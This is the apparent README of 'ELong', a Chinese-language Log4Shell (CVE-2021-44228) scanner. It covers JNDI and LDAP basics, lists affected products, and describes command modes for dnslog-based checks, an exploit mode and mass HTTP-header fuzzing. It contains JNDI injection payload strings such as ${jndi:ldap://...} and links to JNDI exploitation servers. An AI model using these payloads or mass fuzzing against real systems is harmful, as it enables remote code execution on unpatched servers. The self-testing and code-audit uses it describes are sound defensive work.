# ELong-永恒之恶龙

2021年12月9日晚上，Log4j的漏洞详情被公开了。至此，一个神洞出现了。我们给这个漏洞起了一个名字：永恒之恶龙！可以利用该工具更好的自测是否受该漏洞的影响，或是在授权的情况下可以利用该工具更好的进行漏洞探测或漏洞利用。作者将持续关注并逐步公布此漏洞的影响范围。公开版获取方式请查看微信群公告。作者：[Goqi](https://github.com/Goqi)

本项目创建于2021年12月26日，最近的一次更新时间为2022年1月16日。

- [01-漏洞基础](https://github.com/Goqi/ELong#01-%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80)
- [02-上层建筑](https://github.com/Goqi/ELong#02-%E4%B8%8A%E5%B1%82%E5%BB%BA%E7%AD%91)
- [03-漏洞证明](https://github.com/Goqi/ELong#03-%E6%BC%8F%E6%B4%9E%E8%AF%81%E6%98%8E)
- [04-漏洞利用](https://github.com/Goqi/ELong#04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)
- [05-暴力扫描](https://github.com/Goqi/ELong#05-%E6%9A%B4%E5%8A%9B%E6%89%AB%E6%8F%8F)
- [06-代码扫描](https://github.com/Goqi/ELong#06-%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F)
- [07-被动扫描](https://github.com/Goqi/ELong#07-%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F)
- [08-参考资源](https://github.com/Goqi/ELong#08-%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90)

## 01-漏洞基础

一、漏洞描述

​	2021年12月9日晚上，Log4j2 JNDI注入漏洞详情被公开，作者阿里云陈兆军。漏洞发现过程：通过公开的CodeQL规则扫描出来的漏洞。漏洞编号：CVE-2021-44228。影响范围：Apache Log4j 2.x <= 2.15.0-rc1。

二、Log4j2

​	Log4j 是Apache开源的一个Java日志库。

​	Log4j2 是对 Log4j 的升级，它比其前身 Log4j 1.x 提供了显着改进，并提供了 Logback 中可用的许多改进，同时修复了 Logback 架构中的一些固有问题。

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
```

​	Log4j2会解析${}，读取出其中的内容。判断其是否为Ldap实现的JNDI，于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。

三、JNDI-万恶之源

```java
JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。

JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。

JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。
```

四、LADP

```java
LDAP目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。

LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。

目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。

目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。

LDAP目录服务是由目录数据库和一套访问协议组成的系统。
```

五、RMI

```
Java RMI，即 远程方法调用(Remote Method Invocation)，一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API， 能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于Java虚拟机(JVM)，因此它仅支持从一个JVM到另一个JVM的调用。
```

## 02-上层建筑

一、漏洞资产
- [x] Apereo-CAS
- [x] Apache-Druid
- [ ] Apache Dubbo
- [x] Apache-Flink
- [ ] Apache Flume
- [ ] Apache-James#
- [x] Apache-JspWiki
- [ ] Apache-Kafka
- [x] Apache-OFBiz
- [x] Apache-SkyWalking
- [x] Apache-Solr
- [x] Apache-Struts2
- [ ] Apache-Struts2-showcase#
- [ ] Apache Spark
- [x] Apache Storm
- [ ] Apache Tomcat
- [ ] Logstash
- [ ] Elasticsearch#
- [x] MobileIron-User-Portal
- [ ] Redis
- [x] Seeyon
- [ ] SpringBoot#
- [ ] Spring-Boot-strater-log4j2
- [x] Unifi-Network
- [x] VMware-HCX
- [x] VMware-Horizon
- [x] VMware-NSX
- [x] VMware-vCenter
- [x] VMware-vRealize
- [x] VMware-Workspace-One
- [x] Zipkin
- [ ] Ghidra
- [ ] Control-M
- [ ] Symantec-Advanced-Threat-Protection
- [ ] Cisco-CloudCenter-Suite
- [ ] ......

- https://fofa.so/static_pages/log4j2
- https://github.com/cisagov/log4j-affected-db
- https://github.com/YfryTchsGD/Log4jAttackSurface
- https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
- https://github.com/CrackerCat/Log4jAttackSurface
- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages
- https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html
- https://github.com/authomize/log4j-log4shell-affected
- https://github.com/NS-Sp4ce/Vm4J

二、资产识别

​	资产识别功能暂时不准备更新，资产识别可以通过[Banli](https://github.com/Goqi/Banli)这个项目实现！

- ELong.exe is
- ELong.exe is all
- ELong.exe is vmware
- ......

## 03-漏洞证明

程序目前的设计模式是只扫描不检测，通过JNDI或DNSLOG平台判断是否存在漏洞。使用此模块建议在资产识别之后进行。请创建poc.txt文件，内容为dnslog平台URL地址。使用ELong.exe poc seeyon命令，会自动对isSeeyon.txt文件中的致远OA进行漏洞验证，使用ELong.exe poc solr命令，会自动对isSolr.txt文件中的Solr资产进行漏洞验证等。**结果在dnslog平台上面可以看到是那个URL存在漏洞！**使用ELong.exe poc all 会自动对存在漏洞的组件进行批量验证。

目前支持**17个**组件的漏洞概念证明！

- ELong.exe poc
- ELong.exe poc seeyon
- ELong.exe poc solr
- ELong.exe poc all

参考EmYiQing大佬的代码，加入了一键启动JNDI模块。

## 04-漏洞利用

本工具公开版仅为poc验证工具，payload在程序中写死了，只可以判断是否存在漏洞，不可以获取系统权限。内部版提供exp功能，暂时不对外公开。

漏洞利用需要JNDI服务器启动恶意的class类。参下列的项目：

```
 https://github.com/welk1n/JNDI-Injection-Exploit
 https://github.com/bradfitz/jndi
 https://github.com/EmYiQing/LDAPKit
 https://github.com/su18/JNDI
 https://github.com/feihong-cs/JNDIExploit
 https://github.com/0x727/JNDIExploit
 https://github.com/veracode-research/rogue-jndi
 https://github.com/quentinhardy/jndiat
 https://github.com/p1n93r/AttackJNDI
 https://github.com/Jeromeyoung/JNDIExploit-1
 https://github.com/exp1orer/JNDI-Inject-Exploit
 https://github.com/zu1k/ldap-log
 https://github.com/orleven/Celestion
```

请创建exp.txt文件，内容为完整的jndi利用payload。例如：${jndi:ldap://127.0.0.1/exp}

- ELong.exe exp all

## 05-暴力扫描

暴力扫描可以针对任意Java开发的网站！本程序支持**1153个**HTTP请求头的fuzz测试，作者利用此模块成功找到了2个尚未公开组件的RCE漏洞！批量fuzz往往会有意想不到的收获，但使用fuzz模块进行暴力扫描会发送超级多的恶意请求包，安全设备一定会产生告警，**此模块慎用**！使用此模块需要在当前路径创建urls.txt文件，运行程序会对urls.txt文件中的网址进行HTTP请求头批量fuzz验证。

- ELong.exe fuzz 暴力扫描模块！
- ELong.exe fuzz one 默认使用Get请求fuzz，默认支持常见的65个Header。
- ELong.exe fuzz one max 使用Get请求对1153个Header进行漏洞扫描验证。
- ELong.exe fuzz one post 使用post请求进行fuzz验证。
- ELong.exe fuzz one put  使用put请求进行fuzz验证。待实现
- ELong.exe fuzz one option使用option请求进行fuzz验证。待实现
- ELong.exe fuzz all 一次请求发送1153个Header进行漏洞验证。

暴力扫描EXP模块

- ELong.exe fuzzexp 暴力扫描模块！
- ELong.exe fuzzexp one 默认使用Get请求fuzz，默认支持常见的65个Header。
- ELong.exe fuzzexp one max 使用Get请求对1153个Header进行漏洞扫描验证。
- ELong.exe fuzzexp one post 使用post请求进行fuzz验证。
- ELong.exe fuzzexp one put  使用put请求进行fuzz验证。待实现
- ELong.exe fuzzexp one option使用option请求进行fuzz验证。待实现
- ELong.exe fuzzexp all 一次请求发送1153个Header进行漏洞验证。

## 06-代码扫描

此模块适用于企业自检，需要登录服务器之后运行ELong程序，通过scan参数指定扫描的路径即可进行扫描，可以同时指定多个扫描路径。不建议进行根目录扫描，效率太低，无用功太多。此模块也适用于代码审计！

- ELong.exe scan 路径
- ELong.exe scan D:\web
- ./ELong scan /home/web /etc/code

## 07-被动扫描

此模块尚未开发完成。开发计划：在浏览器中设置代理，程序自动根据请求参数进行漏洞扫描验证。

- ELong.exe pass 

## 08-参考资源

- https://github.com/0e0w/HackLog4j
- https://github.com/darkarnium/Log4j-CVE-Detect
- https://github.com/EmYiQing/JNDIScan

![](TEMP/wx.png)